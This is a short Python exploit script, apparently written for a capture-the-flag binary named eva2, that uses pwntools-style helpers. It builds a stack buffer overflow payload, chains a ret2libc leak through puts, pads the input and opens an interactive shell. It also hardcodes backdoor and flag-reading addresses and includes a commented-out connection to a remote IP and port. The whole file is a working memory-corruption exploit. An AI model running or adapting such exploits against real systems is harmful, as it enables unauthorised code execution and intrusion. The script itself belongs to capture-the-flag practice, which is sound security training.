# from LibcSearcher import *
from forbiddenfruit import patchable_builtin
from pwnlib.util.proc import tracer
from helper import *
from pwncli import *
import ctypes as c
from exp import ret2libc_A, ret2libc_B
loader = Loader("target/eva2", 32, debug=True)
# loader.patch_AIO(2.23)
elf,libc,rop = loader.init()
# libc = ELF("target/libc-2.23.so")
# io = loader.process("94.191.76.133",30750)
# io = loader.process()
io = loader.ida()
abbre(globals(), io, loader) # 此处定义了常用的缩写
menu(globals())


ret = 0x08048316
cat_flag = 0x080486ac
backdoor = 0x08048595

# payload = b"a"*(0x1d+4) + p32(backdoor)
# payload = payload.ljust(0x104, b"a")
payload = b"a"*(0x1d+4)
payload = ret2libc_A("puts", "puts", 0x12345, payload, loader)
payload = payload.ljust(0x104, b"a")
sl(payload)
shell()